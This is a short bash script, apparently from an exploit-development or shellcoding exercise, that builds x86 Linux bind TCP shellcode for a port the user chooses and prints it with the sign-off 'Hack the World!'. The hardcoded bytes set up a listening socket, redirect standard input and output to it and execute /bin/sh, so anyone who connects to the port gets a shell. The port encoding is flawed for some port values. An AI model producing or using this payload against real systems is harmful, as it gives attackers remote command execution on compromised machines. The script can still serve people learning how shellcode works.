#!/bin/bash

if [ -z "$1" ]
then
	echo "Usage: $0 <bind port (decimal)>"
	exit
fi

echo
echo "[*] Doing magic with your port number"
echo "[*] Done"

shellcode1="\x31\xc0\x31\xdb\x31\xc9\x99\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x52\x52\x66\x68"

port=$(echo "obase=16; $1" | bc )
port_1st_byte="\x${port:0:2}"
port_2nd_byte="\x${port:2:4}"

le_port="$port_1st_byte$port_2nd_byte" # bind port in liitle endian format

shellcode2="\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x69\x01\xcd\x80\x31\xc0\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x99\x31\xc9\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

final_shellcode+="$shellcode1"
final_shellcode+="$le_port"
final_shellcode+="$shellcode2"

#echo '"$shellcode1"
#echo $shellcode1$le_port$shellcode2

printf "\nEnjoy this Bind TCP Shellcode with the port %s\n\n\"%s\"\n" $1 $final_shellcode
echo
echo $port

echo
echo "--------------------"
echo "[*] Hack the World!"
echo "--------------------"
echo





